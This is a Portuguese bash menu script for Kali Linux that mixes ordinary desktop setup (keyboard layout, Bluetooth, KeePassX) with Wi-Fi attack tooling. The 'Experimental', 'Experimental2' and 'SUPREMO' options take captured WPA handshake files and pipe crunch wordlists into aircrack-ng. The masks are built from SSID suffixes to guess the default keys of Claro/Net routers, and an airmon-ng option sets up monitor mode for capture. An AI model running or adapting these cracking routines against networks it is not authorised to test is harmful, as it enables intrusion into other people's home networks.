#!/bin/bash
# Forma do texto
#################################
# Colors
#PURPLE = '\033[95m'
#CYAN = '\033[96m'
#DARKCYAN = '\033[36m'
#BLUE = '\033[94m'
#GREEN = '\033[92m'
#YELLOW = '\033[93m'
#RED = '\033[91m'
#BOLD = '\033[1m'
#UNDERLINE = '\033[4m'
#END = '\033[0m'
#RESET='\033[1;00m'
#################################
bold=$(tput bold) # Negrito
# Resetar configurações de texto
txtrst=$(tput sgr0) # Text reset
# Cor do Texto
txtred=$(tput setaf 1) # Vermelho
txtgrn=$(tput setaf 2) # Verde
txtblu=$(tput setaf 4) # Azul
txtylw=$(tput setaf 3) # Amarelo
txtpur=$(tput setaf 5) # Purpura
cor1=$txtblu
cor2=$txtblu
cor3=$txtblu
cor4=$txtblu
cor5=$txtblu
cor6=$txtblu
cor7=$txtblu
cor8=$txtblu
cor9=$txtblu
cor10=$txtblu
corLink=$txtred
n1="1"
n2="2"
n3="3"
n4="4"
n5="5"
n6="6"
n7="7"
n8="8"
n9="9"
n10="10"
mensagem=""
mensagem2=""
if ip link | grep "state UP" 1> /dev/null 2> /dev/null; then corLink=$txtgrn; fi    #[ ip link | grep -o "state UP" ] && corLink=$txtgrn
[ -f /usr/bin/convert ] && cor10=$txtgrn && n10="OK" 
[ -f /usr/bin/keepassx ] && cor4=$txtgrn  && n4="OK"
bluetst=$(systemctl status bluetooth.service | grep Active | awk '{print $2}'); [ $bluetst = "active" ] && cor3=$txtgrn && n3="OK" 
#xmodmaptst=$(xmodmap -pp) ; [ $xmodmaptst = "active" ] && cor1=$txtgrn && n1="OK"
Principal() {
  echo
  clear
  echo
  echo 
  echo ${bold}${corLink}"           OTIMIZAÇÃO KALI "${txtrst}
  echo ${txtblu}"--------------------------------------"${txtrst}
  echo ${bold}${txtylw}"Remover copy touchpad...........${bold}${cor1}[ $n1 ]${txtrst}"
  echo ${bold}${txtylw}"Alterar teclado para BR-ABNT2...${bold}${cor2}[ $n2 ]${txtrst}"
  echo ${bold}${txtylw}"Instalar e Startar Bluetooth....${bold}${cor3}[ $n3 ]${txtrst}"
  echo ${bold}${txtylw}"Instalar KeePassX...............${bold}${cor4}[ $n4 ]${txtrst}"
  echo ${bold}${txtylw}"Colocar Wi-Fi em modo monitor...${bold}${cor5}[ $n5 ]${txtrst}"
  echo ${bold}${txtylw}"Desfazer Modo do adaptador ESP..${bold}${cor6}[ $n6 ]${txtrst}"
  echo ${bold}${txtblu}"Experimental (Claro/Net)........${bold}${cor7}[ $n7 ]${txtrst}"
  echo ${bold}${txtblu}"Experimental2 (Claro/Net).......${bold}${cor8}[ $n8 ]${txtrst}"
  echo ${bold}${txtblu}"SUPREMO.........................${bold}${cor9}[ $n9 ]${txtrst}"
  echo ${bold}${txtylw}"Converter jpeg para png.........${bold}${cor10}[ $n10 ]${txtrst}"
  echo ${bold}${bold}${txtred}"Sair............................[ 0 ]${txtrst}"
  echo ${txtblu}"--------------------------------------"${txtrst}
  echo ${bold}${txtgrn} $mensagem ${txtrst}
  echo ${bold}${txtgrn} $mensagem2 ${txtrst}
  mensagem=""
  mensagem2=""
  echo -n ${bold}${txtylw}"Qual o passo desejado (1,2,3,4,5,6,7,8 ou 9)? ${txtrst}"
  read opcao
  case $opcao in
    1) CopyTouch;;
    2) TecladoBR;;
    3) InstaBlue;;
    4) Keepassx;;
    5) Airmon;;
    6) DesfazerEspecifico;;
    7) Experimental;;
    8) Experimental2;;
    9) Supremo;;
    10) Converter;;
    11|s|S|0|Sair|sair|fechar|q|Q|exit|Exit) echo ${bold}${txtylw}"\n Até logo!"${txtrst}; exit;;
    *) mensagem="Opção desconhecida. Tente novamente."; Principal ;;
  esac
}

CopyTouch() {
  ## Remove copy da função scroll do touchpad
  cor1=$txtgrn
  n1="OK"
  xmodmap -e "pointer = 1 25 3 4 5 6 7 8 " 2> /dev/null 
  echo
  mensagem="Copy Touchpad removido"
  
  Principal
}

TecladoBR() {
  ## Configurando o teclado para brasil.
  cor2=$txtgrn
  n2="OK"
  setxkbmap -model abnt2 -layout br 2> /dev/null
  echo
  mensagem="Teclado alterado para BR-ABNT2"
  
  Principal
}

InstaBlue() {
  ## Configurando o bluetooth
  cor3=$txtgrn
  n3="OK"
  #apt-get install bluez* -y 1> /dev/null 2> /dev/null  && echo ${bold}${txtgrn}"Bluetooth instalado"${txtrst}
  #necessário verificiar se o módulo já existe. 
  #modprobe btsub 
  systemctl enable bluetooth.service 1> /dev/null 2> /dev/null && mensagem="Bluetooth habilitado"
  systemctl start bluetooth.service 1> /dev/null 2> /dev/null && mensagem2="Bluetooth iniciado"
  
  Principal
}

Keepassx() {
  ## Instala o Keepassx
  cor4=$txtgrn
  n4="OK"
  if [ ! -f /usr/bin/keepassx ]
    then
      apt-get install keepassx 1> /dev/null 2> /dev/null 
      mensagem="KeePassX instalado" 
    else
      mensagem="KeePassX já estava instalado"
  fi   
  Principal
  
}

Airmon() {
  cor5=$txtgrn
  n5="OK"
  wlanX1=$(ifconfig | grep wlan | sed -e 's/://g' | awk '{print $1}')
  echo -n "Qual o adaptador wireless (wlan0,wlan1,etc)?"
  read wlanX
  wlanX=$(echo "${wlanX:=$wlanx1}")
  #airmon-ng check kill
  airmon-ng start "$wlanX" 1 
  monX1=$(ifconfig | grep wlan | sed -e 's/://g' | awk '{print $1}')
  monX=$(echo "${monX:=$monX1}")
  airmon-ng start "$monX"
  ##airodump-ng "$monX"
  mensagem="$monX configurado"
   
  Principal
  ## Ver comando "ip link set wlan0 promisc on"
  ## Usar variáveis globais
  ## Em caso de existir uma única placa, apenas informar 
}

DesfazerEspecifico() {
  cor6=$txtgrn
  n6="OK"
  wlanEspec1=$(ifconfig | grep wlan | sed -e 's/://g' | awk '{print $1}')
  echo -n "Qual o adaptador wireless ($wlanEspec1,wlan0,wlan1,etc)?"
  read wlanEspec
  wlanEspec=$(echo "${wlanEspec:=$wlanEspec1}")
  airmon-ng stop  "$wlanEspec"
  mensagem="$wlanEspec restaurado."
  #airmon-ng stop "$monX"
  ## ifconfig "$WIFIMON" down

  ##Para ser usado quando a interface que estiver em PROMISCUO, em Muticast novamente.
  Principal
  
}

Experimental() {
 ## Este comando com o parametro -e abre o xterm como comando que segue.
  #xterm -e wifite --wpa ; sleep 30  &
  echo "Digite o nome"
  ls /run/live/persistence/sdb2/rw/home/kali/hs/*.cap | cut -d "_" -f 2
  read nome01
  arquivo01=$(ls /run/live/persistence/sdb2/rw/home/kali/hs/*.cap | grep .*"$nome01"*.)
  echo "$arquivo01" | cut -d "_" -f "2"  
  sleep 3
  if [ -f "$arquivo01" ]
    then 
      cor7=$txtgrn
      n7="OK"
      bssid01=$(echo "$arquivo01" | cut -d "_" -f "3" | sed -e 's/-/:/g')
      #finalMac01=$(echo "$bssid01" | cut -d ":" -f "4-6" | sed -e 's/://g')
      finalClaro01=$(echo "$arquivo01" | cut -d "_" -f "2"  | cut -c 8-13)
      finalNet01=$(echo "$arquivo01" | cut -d "_" -f "2"  | cut -c 6-11)
      #echo "Iniciando verificação no $arquivo01"
      #sleep 20
      senha01="ABCDEF9876543210"
      finalXXX="$finalClaro01"
      crunch 8 8 "$senha01" -t @@"$finalXXX" | aircrack-ng --bssid "$bssid01" -w- "$arquivo01"   
      sleep 10 
      if [ $arquivo01 = "CLARO" ]
       then
          finalXXX="$finalNet01"
        else 
          finalXXX="@@@@@@" 
          senha01="0123456789" 
      fi
      crunch 8 8 "$senha01" -t @@"$finalXXX" | aircrack-ng "$arquivo01"  --bssid "$bssid01" -w- 
      echo 
      sleep 30
    else
     cor7=$txtred
     n7="NO"
     mensagem="Nome inexistente."
       
  fi
  
  Principal
  
}
Experimental2() {
 ## Este comando com o parametro -e abre o xterm como comando que segue.
  #xterm -e wifite --wpa ; sleep 30  &
  echo "Digite o nome"
  ls /run/live/persistence/sdb2/rw/home/kali/hs/*.cap | cut -d "_" -f 2
  read nome01
  arquivo01=$(ls /run/live/persistence/sdb2/rw/home/kali/hs/*.cap | grep .*"$nome01"*.)
  echo "$arquivo01" | cut -d "_" -f "2"  
  sleep 3
  if [ -f "$arquivo01" ]
    then 
      cor8=$txtgrn
      n8="OK"
      bssid01=$(echo "$arquivo01" | cut -d "_" -f "3" | sed -e 's/-/:/g')
      #finalMac01=$(echo "$bssid01" | cut -d ":" -f "4-6" | sed -e 's/://g')
      finalClaro01=$(echo "$arquivo01" | cut -d "_" -f "2"  | cut -c 8-13)
      finalNet01=$(echo "$arquivo01" | cut -d "_" -f "2"  | cut -c 6-11)
      #echo "Iniciando verificação no $arquivo01"
      #sleep 20
      senha01="ABCDEF9876543210"
      finalXXX="$finalClaro01"
      crunch 8 8 "$senha01" -t @@"$finalXXX" | aircrack-ng --bssid "$bssid01" -w- "$arquivo01"   
      sleep 10 
      if [ $arquivo01 = "CLARO" ]
       then
          finalXXX="$finalNet01"
        else 
          finalXXX="@@@@@@" 
          senha01="abcdefghijlmnopqrstwykxz" 
      fi
      crunch 8 8 "$senha01" -t @@"$finalXXX" | aircrack-ng "$arquivo01"  --bssid "$bssid01" -w- 
      echo 
      sleep 30
    else
     cor8=$txtred
     n8="NO"
     mensagem="Nome inexistente."
      
  fi
  
  Principal
  
}
Supremo() { 
 echo "Digite o nome:"
 echo
 partit=$(df -lh | grep persistence | awk -F / '{print $7}' | grep 2)
 ls /run/live/persistence/"$partit"/rw/home/kali/hs/*.cap | cut -d "_" -f 2
 echo
 read nome01
 echo
 echo -n  "Para qual tipo de senha?"
 echo
 echo ${bold}${txtylw}"1) 0-9"${txtrst}
 echo ${bold}${txtylw}"2) 9-0"${txtrst}
 echo ${bold}${txtylw}"3) a-z"${txtrst}
 echo ${bold}${txtylw}"4) a-z e 0-9"${txtrst}
 echo ${bold}${txtylw}"4) z-a e 0-9"${txtrst}
 echo ${bold}${txtylw}"5) A-Z e 0-9"${txtrst}
 echo ${bold}${txtylw}"6) A-Z e 0-9"${txtrst}
 echo ${bold}${txtylw}"6) A-Z e 9-0"${txtrst}
 echo
 read senhax
 [ $senhax = 1 ] && senhax='0123456789'
 [ $senhax = 2 ] && senhax='9876543210'
 [ $senhax = 3 ] && senhax='abcdefghijlmnopqrstuvxzkwy'
 [ $senhax = 4 ] && senhax='abcdefghijlmnopqrstuvxzkwy1234567890'
 [ $senhax = 5 ] && senhax='ywkzxvutsrqponmljihgfedcba1234567890'
 [ $senhax = 6 ] && senhax='ABCDEFGHIJLMNOPQRSTUVXZKWY1234567890'
 [ $senhax = 7 ] && senhax='ABCDEFGHIJLMNOPQRSTUVXZKWY9876543210'
 
 arquivo01=$(ls /run/live/persistence/"$partit"/rw/home/kali/hs/*.cap | grep -i $nome01)
 cor9=$txtgrn
 n9="OK"
 bssid01=$(echo "$arquivo01" | cut -d "_" -f "3" | sed -e 's/-/:/g')
 if [ -f $arquivo01 ] 
   then
       crunch 8 8 "$senhax" -t @@@@@@@@ | aircrack-ng "$arquivo01" --bssid "$bssid01" -w-
       echo 30
	
    else
       echo "Arquivo não encontrado:$arquivo01"

 fi

 Principal

}
Converter() {
  cor10=$txtgrn
  n10="OK"
  if [ ! -f /usr/bin/convert ]
    then
     apt-get install convert -y 1> /dev/null 2> /dev/null 
      mensagem="Convert instalado" 
    else
      mensagem="Convert já estava instalado"
  fi   
  #cd /home/kali/Downloads
  #for i in *.jpeg; do convert "$i" "Mabelle-$RANDOM.png"; done    
  
  Principal
  
}


Principal
#xfce4-mouse-settings
